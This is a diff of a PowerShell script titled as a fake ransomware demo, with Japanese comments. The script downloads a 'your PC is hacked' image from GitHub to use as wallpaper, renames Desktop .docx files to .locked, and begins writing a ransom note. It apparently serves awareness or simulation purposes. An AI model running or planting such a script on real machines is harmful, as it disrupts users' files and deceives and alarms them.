@@ -1,5 +1,8 @@
 ﻿# FakeRansom_JP_GitHubWall.ps1 (修正版・最終)
 
+$desktop = [Environment]::GetFolderPath("Desktop")
+Write-Host "実行時 Desktop path: $desktop"
+
 # 設定
 $url = "https://raw.githubusercontent.com/cyberattackerdemo/main/main/yourpcishacked.jpg"
 $imgPath = "$env:PUBLIC\yourpcishacked.jpg"
@@ -36,14 +39,28 @@ public class Wallpaper {
 }
 
 try {
-    # .txt, .docx ファイルを .locked にリネーム（デスクトップ直下のみ）
-    Get-ChildItem -Path $desktop -Include *.txt, *.docx -File | ForEach-Object {
-        $newName = "$($_.BaseName).locked"
-        Rename-Item -Path $_.FullName -NewName $newName -Force
+    Write-Host "デスクトップパス確認: $desktop"
+    Write-Host "リネーム対象の.docxファイルを検索中..."
+
+    $docxFiles = Get-ChildItem -Path $desktop -Filter *.docx -File
+    if ($docxFiles.Count -eq 0) {
+        Write-Host "対象ファイルが見つかりませんでした。"
+    } else {
+        foreach ($file in $docxFiles) {
+            try {
+                $newName = "$($file.BaseName).locked"
+                Rename-Item -Path $file.FullName -NewName $newName -Force -Verbose
+                Write-Host "リネーム成功: $($file.Name) -> $newName"
+            } catch {
+                Write-Host "リネーム失敗: $($file.Name) - $($_.Exception.Message)"
+            }
+        }
     }
 } catch {
-    Write-Host "ファイルリネームでエラー: $($_.Exception.Message)"
+    Write-Host "ファイルリネーム全体でエラー: $($_.Exception.Message)"
 }
+
+
 
 try {
     # ランサムノート作成（UTF-8 BOMで文字化け防止）
